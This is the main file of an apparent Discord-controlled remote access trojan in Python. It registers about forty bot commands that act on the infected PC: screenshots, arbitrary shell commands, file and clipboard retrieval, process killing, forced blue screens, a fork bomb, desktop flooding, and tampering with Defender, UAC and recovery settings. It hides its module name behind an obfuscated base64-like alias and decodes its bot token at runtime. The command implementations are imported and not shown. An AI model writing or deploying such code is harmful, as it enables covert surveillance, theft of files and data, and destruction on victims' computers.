from imports.imports import *
def print(c):
    bot.run(c)

intents = discord.Intents.all()
bot=YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Bot(command_prefix='.',intents=intents,help_command=None)
bot.commandzchannel={}

@bot.event
async def on_message(message):
    if message.channel.id not in bot.commandzchannel:
        return
    await bot.process_commands(message)
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, discord.ext.commands.CommandNotFound):
        command = ctx.message.content.split(' ')[0]
        embed = discord.Embed( 
            title="Command Not Found",
            description=f"no command named `{command}`",
            color=discord.Color.red()
        )
        embed.set_footer(text="for a command list, type .help")
        embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
        embed.add_field(name="Error Type", value="CommandNotFound", inline=False)
        try: 
            embed.set_thumbnail(url="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/d1b65dfd-f0c3-489c-9a7b-fd6b1036aa38/dlzrrd-1e6be49a-872f-4fb5-850e-83e80fbb9552.png/v1/fill/w_256,h_256,q_80,strp/vista_error_icon__psd_by_planetlive_dlzrrd-fullview.jpg")
        except:
            pass
        await ctx.send(embed=embed)
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(takepic, name='ss'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(clean, name='clean'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(cmd, name='cmd'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(close, name='reload'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(speak, name='speak'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(openurl, name='openurl'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(search, name='search'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(sharenote, name='sharenote'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(startupapps, name='startupapps'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(processes, name='lp'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(share_file, name='share'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(setvol, name='setvol'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(bsod, name='bsod'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(pc, name='pc'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(kp, name='kp'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(manageuser, name='user'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(wallpaper, name='wallpaper'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(mouse_control, name='mouse'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(endpc, name='endpc'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(cd_command, name='cd'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(taskbar, name='taskbar'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(forkbomb, name='forkbomb'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(alert, name='alert'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(admin, name='admin'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(sysinfo, name='sysinfo'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(cb, name='cb'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(clear, name='clear'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(taskmanagerset, name='tm'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(helpcommand, name='help'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(nofilespls, name='deskflood'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(fileretrieval, name='getfiles'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(rotate, name='rotate'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(ezip,name='ezip'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(invcol,name='invcol'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(fetchlink,name='linkshare'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(defend,name='defender'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(reagentc,name='reagentc'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(sites,name='sites'))
bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(uac,name='uac'))
@bot.event
async def on_ready():
 await run(bot)
bot.run(ggs.decode('utf-8'))